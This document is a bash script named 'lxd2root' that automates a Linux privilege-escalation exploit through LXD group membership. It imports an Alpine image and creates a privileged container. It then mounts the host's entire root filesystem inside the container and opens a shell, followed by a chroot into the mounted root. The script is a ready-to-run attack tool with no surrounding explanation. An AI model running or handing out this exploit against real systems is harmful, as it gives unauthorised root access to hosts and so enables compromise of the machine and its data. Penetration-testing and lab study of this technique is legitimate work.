#!/bin/bash
echo -e "\033[1;36m"
echo " |            | _  )                 |  "
echo " | \ \ /   _\` |   /    _| _ \   _ \   _|"
echo "_|  _\_\ \__,_| ___| _| \___/ \___/ \__|"
echo -e "             Author: karthik"
echo -e "\033[0m"


GREEN='\033[0;32m'
BOLDGREEN='\033[1;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}Make sure 'alpine-v3.13-x86_64-20210218_0139.tar.gz' is in the same directory${NC}"

if [[ -f "alpine-v3.13-x86_64-20210218_0139.tar.gz" ]]; then
    # Check if myimage already exists
    if lxc image list | grep -q 'myimage'; then
        echo -e "${YELLOW}[!] 'myimage' already exists. Skipping image import...${NC}"
    else
        echo -e "${BOLDGREEN}[+] Importing image...${NC}"
        lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
        if [[ $? -ne 0 ]]; then
            echo -e "${RED}[!] Failed to import image.${NC}"
            exit 1
        fi
    fi

    echo -e "${BOLDGREEN}[+] Listing images...${NC}"
    lxc image list
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Failed to list images.${NC}"
        exit 1
    fi

    # Check if a storage pool exists, if not create a default one
    if [[ $(lxc storage list --format csv | wc -l) -eq 0 ]]; then
        echo -e "${RED}[!] No storage pool found. Creating default storage pool...${NC}"
        echo -e "${BOLDGREEN}[+] Creating default storage pool...${NC}"
        lxc storage create default dir
        if [[ $? -ne 0 ]]; then
            echo -e "${RED}[!] Failed to create storage pool.${NC}"
            exit 1
        fi
        lxc profile device add default root disk path=/ pool=default
        if [[ $? -ne 0 ]]; then
            echo -e "${RED}[!] Failed to add root disk device to default profile.${NC}"
            exit 1
        fi
    fi

    echo -e "${BOLDGREEN}[+] Initializing container...${NC}"
    lxc init myimage ignite -c security.privileged=true
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Failed to initialize container.${NC}"
        exit 1
    fi

    echo -e "${BOLDGREEN}[+] Adding device...${NC}"
    lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Failed to add device.${NC}"
        exit 1
    fi

    echo -e "${BOLDGREEN}[+] Starting container...${NC}"
    lxc start ignite
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Failed to start container.${NC}"
        exit 1
    fi

    echo -e "${BOLDGREEN}[+] Executing shell in container...${NC}"
    lxc exec ignite /bin/sh
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Failed to execute shell in container.${NC}"
        exit 1
    fi

    echo -e "${BOLDGREEN}[+] Changing directory to /mnt/root...${NC}"
    cd /mnt/root
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Failed to change directory to /mnt/root.${NC}"
        exit 1
    fi

    echo -e "${BOLDGREEN}[+] Chroot into /mnt/root...${NC}"
    chroot /mnt/root /bin/bash
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Failed to chroot into /mnt/root.${NC}"
        exit 1
    fi

else
    echo -e "${RED}'alpine-v3.13-x86_64-20210218_0139.tar.gz' not found!${NC}"
fi
echo whoami
whoami